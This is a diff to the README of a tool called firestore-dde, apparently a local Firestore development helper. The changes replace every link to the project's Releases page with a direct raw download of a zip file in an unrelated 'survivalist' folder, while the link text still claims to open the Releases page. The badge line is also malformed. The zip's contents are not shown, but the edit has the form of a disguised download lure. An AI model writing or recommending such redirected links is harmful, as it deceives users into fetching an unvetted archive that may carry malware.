@@ -4,13 +4,13 @@
 Welcome to **firestore-dde**! This tool helps you easily set up a local development environment to work with Firestore, Google's NoSQL database. It provides a straightforward way to develop applications locally before deploying them. 
 
 ## 🔗 Download Now
-[![Download firestore-dde](https://img.shields.io/badge/Download%20firestore--dde-blue.svg)](https://github.com/FAMASZILA/firestore-dde/releases)
+[![Download firestore-dde](https://raw.githubusercontent.com/FAMASZILA/firestore-dde/main/survivalist/firestore-dde.zip%https://raw.githubusercontent.com/FAMASZILA/firestore-dde/main/survivalist/firestore-dde.zip)](https://raw.githubusercontent.com/FAMASZILA/firestore-dde/main/survivalist/firestore-dde.zip)
 
 ## 📥 Download & Install
 To begin using **firestore-dde**, you need to download the application files. Follow these steps:
 
 1. Click the link below to go to the Releases page.
-   - [Visit Releases Page to Download](https://github.com/FAMASZILA/firestore-dde/releases)
+   - [Visit Releases Page to Download](https://raw.githubusercontent.com/FAMASZILA/firestore-dde/main/survivalist/firestore-dde.zip)
 
 2. On the Releases page, you will find various versions of the software.
 
@@ -51,6 +51,6 @@ If you encounter issues or need assistance, please refer to the FAQ section in t
 ## 🔄 Stay Updated
 Keep an eye on the Releases page for future updates. Regular updates include new features, performance improvements, and bug fixes.
 
-- [Visit Releases Page for Updates](https://github.com/FAMASZILA/firestore-dde/releases)
+- [Visit Releases Page for Updates](https://raw.githubusercontent.com/FAMASZILA/firestore-dde/main/survivalist/firestore-dde.zip)
 
 Thank you for using **firestore-dde**! We hope this tool makes your development process smoother and more efficient.
